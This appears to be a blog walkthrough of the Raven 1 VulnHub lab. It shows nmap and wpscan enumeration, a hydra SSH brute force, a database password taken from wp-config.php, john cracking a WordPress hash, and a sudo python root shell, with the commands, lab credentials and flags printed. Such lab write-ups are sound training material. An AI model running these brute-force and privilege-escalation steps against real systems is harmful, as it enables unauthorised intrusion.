---
layout: post
title: "Raven 1 Vulnhub Walkthrough"
categories: VulnHub
published: true
---

![banner](/assets/pictures/raven.jpg)

## Reconnaissance

Let's find the machine's IP using `netdiscover`. The following command is to find an IP address in the range of subnet 10.0.2.0-255 and CIDR 24 using the ethernet network interface. In my case, the vulnerable machine is at 10.0.2.10.

> sudo netdiscover -i eth0 -r 10.0.2.0/24

![netdiscover](/assets/pictures/raven-1.png)

---

As usual, I scanned the machine's network using an aggressive mode to find all possible open ports. There are 4 active ports.

> sudo nmap -sC -sV -A -p- 10.0.2.10 -oN nmap.txt --vv

```bash
Nmap scan report for 10.0.2.10
Host is up, received arp-response (0.00096s latency).
Scanned at 2022-08-26 04:22:10 EDT for 21s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKh+Rdkjjy5opFFtXyNt53JA6r4vcBU/5phBALFa3s/Tp1nk905px99+yBZcDIsWCJRcpZLSjrB6HLSP32+zhb9pnVWpTS8Jj7Sxrz1UKww4jiqLTRWM498YHjUrTKPkKb9hC4+xhZjVme8BA7JP65hGMJFHWbmWbDIeQ014EVAJAAAAFQDco2jBlKC2i5fJa3EJU8Cjb7la1wAAAIBZgJ8eIMdjFiKHPVKBClyJeUKdlSh0zsLVz4qNOsd9Q1Tn0qUsHRFHzZ4TKxitg6ICqq3COGIf09sevQHZR2tvDm5mV/mx9rBDK88h31ZyiuGr6aEoo+xPZR4TY++mFNY+deB3N7qtGpUH0ACMgrzfFjtIoaxub9y8IzlTTeB+uQAAAIB9h0DDtN8hOxAkGnFKV3hsq4VivzclLtuUD8vFk6Br51X1S2TdrWCsjqJC+RqW3Q6Z/QNJo3CqlflRbT92HMDenF1h04ET7tv9Rzplj89rFI0NEJ1MUgWkIsf4O4kyM2I6c27Law+tsa1htco6mTuoc8jLOhlhccbsYSgUnhfcNg==
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV+10/5GT/t8oHYE/2droICkXQmZ+vUokINs67o65J9JuOTwxfYpcDKG7Ir5SCVyht+9yblaT4CDKpEkTP7i3yZH1kATaNThwwwDrbYJj2Trn0lCNRMzL8UwYIYBQLVGSBPr40i+rp0aimY6NCohYE7yPZfGQCMgUabN70ZOPX5av/11pe4aaiB1VkdQI6KGOIxX9BzXZ+xx18aGY2L4gEHsSFKHsCHMDcf0LRwCL57JU7slPLH52dgsQc+XxLwjRPOdi3ndVrXnwGkEMBdw0eM7Ta0UyJnsMoynCkaJFG7FaNe/hdkI68g4o8nugBk4RiKOlDBxAIHYT+YUQmrJaF
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWnVibAcyZ6gXZIUhw1P2L5l+9u9WKbtJn4rAZ0+MDtzwKhN/d6sqH3FUnTcswHaT8pKcJvGKSGZae1oqxb3oQ=
|   256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAesXwn7VLv7XmXLfdeAjITtlzFHXlFpvHQt4gnQ3xSI
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40021/tcp   status
|   100024  1          54724/udp6  status
|   100024  1          54761/tcp6  status
|_  100024  1          60184/udp   status
40021/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
MAC Address: 08:00:27:AC:79:1B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/26%OT=22%CT=1%CU=37692%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=630882C7%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O
OS:5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)
```
---

## Enumeration

I surf their website while doing code review and found a wordpress path along with custom domain, `http://raven.local/wordpress`. Let's add it into /etc/hosts file.

![2](/assets/pictures/raven-2.png)

I've been brute forcing website directories and found nothing interesting. However, because the website is built with WordPress, I tried enumerating wordpress details and discovered two users named Steven and Michael. 

> wpscan --url [url] --enumerate u

* url - is to assign an url 
* enumerate - uses for enumeration
* u option - means users, we use it to enumerate any registered user on the wordpress site

```bash
[i] User(s) Identified:

[+] michael
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
---
## Gaining access

I use Michael and Steven for brute forcing the wordpress valid credentials, but there's no valid login found. Next, I tried to brute force the SSH login using those 2 and found one valid login LOL. The credential is very weak as it using the same value of username & password. I never expected this will happen haha.

> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.10 -t4

```bash
[DATA] attacking ssh://10.0.2.10:22/
[22][ssh] host: 10.0.2.10   login: michael   password: michael
1 of 1 target successfully completed, 1 valid password found
```
I successfuly logged in as michael but there's nothing interesting found in the home directory. 

![reven-3](/assets/pictures/raven-3.png)

However, I tried to enumerate the web server directory and found the first and second flags. The first flag is located in the comment section of `service.html`. The second flag is located in `/var/www/flag2.txt`.

```bash
<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->

michael@Raven:/var/www$ cat flag2.txt 
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
```

This is just the beginning of exploitation. As the author said, there are four total flags. I need to find two more flags on the vulnerable machine. Let's go! For the next enumeration, I managed to log into the MySQL server using root credentials that I found in `wp-config.php`.

```php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

I logged in and discovered two hashed passwords from previous users, Michael and Steven. I'm curious if I can brute force Steven's hashed password. So I grab it and use john with the rockyou wordlist to brute force it. 

![raven](/assets/pictures/raven-4.png)

My curiosity is true when I successfully brute force that particular hashed password. The plain text password is `pink84`. 

```bash
└─$ john -w=/usr/share/wordlists/rockyou.txt pass.hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (?)     
1g 0:00:00:01 DONE (2022-08-26 06:05) 0.5291g/s 24279p/s 24279c/s 24279C/s tamika1..milkdud
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Boom! The flag3 is located in the wordpress post. However, there's no such link that might lead to this particular post. So, we have to login to the dashboard in order to view it. But that doesn't matter. If we try to brute force the directory, we might find it in a `/2018` directory, but that will take forever.

![flag3](/assets/pictures/raven-5.png)

---

## Post-exploitation

I logged in as steven in the vulnerable machine using `su steven`. In my case, the first step to performing privilege escalation is by viewing sudo access. I executed the `sudo -l` command and found that Steven could execute python with sudo access.

```bash
User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

We can simply execute a root shell using any binary that has sudo access. As we can see, Steven can run python with sudo without a password. Hence, we can try to exploit it using a payload from [GTFOBins](https://gtfobins.github.io/).

![raven-6](/assets/pictures/raven-6.png)

```bash
$ sudo python -c 'import os; os.system("/bin/sh")'
# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
```
---

### Final flag:

Huge thanks to William McCann or @mccannwj, I enjoyed solving your vulnerable box. I am looking forward to solving the second version of Raven soon!

![raven-7](/assets/pictures/raven-7.png)